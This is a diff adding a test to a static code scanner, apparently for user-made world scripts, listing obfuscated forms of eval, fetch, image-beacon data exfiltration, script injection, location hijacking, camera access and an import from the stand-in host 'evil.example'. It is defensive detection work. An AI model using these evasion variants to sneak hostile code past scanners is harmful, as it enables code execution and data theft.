@@ -24,6 +24,55 @@ test('危険なコードを見つける', () => {
   assert.deepEqual(rules('obj.eval(1); loader.fetchThing(); el.innerHTML === s; x.retrieval()'), [])
 })
 
+test('書き方を変えた危険なコードも見つける', () => {
+  const rules = (code: string) => [...new Set(scanCode('a.js', code).map((f) => f.rule))]
+  const cases: [string, string][] = [
+    ['window.eval(s)', 'no-eval'],
+    ['globalThis.eval(s)', 'no-eval'],
+    ['eval?.(s)', 'no-eval'],
+    ['(0, eval)(s)', 'no-eval'],
+    ['window["eval"](s)', 'no-eval'],
+    ['(() => {}).constructor(s)()', 'no-new-function'],
+    ['(async function () {}).constructor(s)', 'no-new-function'],
+    ['x["constructor"](s)', 'no-new-function'],
+    ['Function(s)()', 'no-new-function'],
+    ['globalThis.fetch(u)', 'no-network-without-permission'],
+    ['self.fetch(u)', 'no-network-without-permission'],
+    ['window?.fetch(u)', 'no-network-without-permission'],
+    ['window["fetch"](u)', 'no-network-without-permission'],
+    ['fetch?.(u)', 'no-network-without-permission'],
+    ['new window.WebSocket(u)', 'no-network-without-permission'],
+    ["new Image().src = 'https://x/?' + data", 'no-network-without-permission'],
+    ['(new Image).src = u', 'no-network-without-permission'],
+    ['window.open(u)', 'no-network-without-permission'],
+    ['new Worker(u)', 'no-worker'],
+    ['new SharedWorker(u)', 'no-worker'],
+    ['document.createElement("SCRIPT")', 'no-dangerous-dom'],
+    ["document.createElement('iframe')", 'no-dangerous-dom'],
+    ['document.createElementNS(ns, "script")', 'no-dangerous-dom'],
+    ['a.srcdoc = s', 'no-dangerous-dom'],
+    ['a.setAttribute("srcdoc", s)', 'no-dangerous-dom'],
+    ['el.innerHTML += s', 'no-dangerous-dom'],
+    ['location = url', 'no-global-override'],
+    ['location.assign(u)', 'no-global-override'],
+    ['location.replace(u)', 'no-global-override'],
+    ['document.location = u', 'no-global-override'],
+    ['window["location"] = u', 'no-global-override'],
+    ["navigator['mediaDevices']['getUserMedia']({ video: true })", 'no-navigator-access'],
+    ['import("//evil.example/x.js")', 'no-external-import'],
+  ]
+  for (const [code, rule] of cases) assert.ok(rules(code).includes(rule), `${code} → ${rule}`)
+  // 似ているが安全なもの（ふつうのワールドで使う書き方）
+  for (const code of [
+    'const location = getLocation(); let evaluation = 1; const o = { eval: 1 }',
+    'new this.constructor(a); new a.b.constructor(n); new v[k].constructor(v[k])',
+    'class A { constructor(x) { this.x = x } }',
+    'state["open"] = true; door.open(); x.location = p; img.src = url',
+    'const frag = `layout(location = 0) out highp vec4 pc_fragColor;`',
+    'const scriptName = "script"; el.className = "iframe-like"',
+  ]) assert.deepEqual(rules(code), [], code)
+})
+
 test('許可ドメインの判定', () => {
   assert.equal(domainAllowed('https://cdn.example.com/a.mp4', ['cdn.example.com']), true)
   assert.equal(domainAllowed('https://a.b.example.com/x', ['*.example.com']), true)
